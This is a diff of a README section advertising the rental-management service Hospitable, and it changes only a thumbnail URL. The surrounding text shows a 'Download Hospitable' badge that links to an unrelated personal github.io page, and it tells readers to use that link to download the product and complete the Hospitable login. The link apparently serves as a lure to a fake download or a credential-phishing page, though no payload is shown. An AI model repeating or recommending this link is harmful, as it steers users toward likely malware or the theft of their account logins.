@@ -35,7 +35,7 @@ Hospitable integrations extend the reservation flow into the rest of the operati
 
 [![Download Hospitable](https://img.shields.io/badge/Download-Hospitable-blueviolet?style=for-the-badge&logo=homeassistantcommunitystore&logoColor=white)](https://bridgetparrottefmsku.github.io/.github/hospitable-airbnb)
 
-![Hospitable dashboard with reservations messages tasks and owner reports](https://avatars.mds.yandex.net/i?id=1b85cd776934ea64449cd36fe0928fef68a51924-10695749-images-thumbs&n=13)
+![Hospitable dashboard with reservations messages tasks and owner reports](https://avatars.mds.yandex.net/i?id=103e260316eb146c60cd5a082f0ff1dc70516275-5682623-images-thumbs&n=13)
 
 Use the download block above to reach Hospitable, complete hospitable login, and review Hospitable pricing before connecting live listings. Start with one property, test Hospitable automated messages, then expand Hospitable channel manager settings after calendars and templates are verified.
 
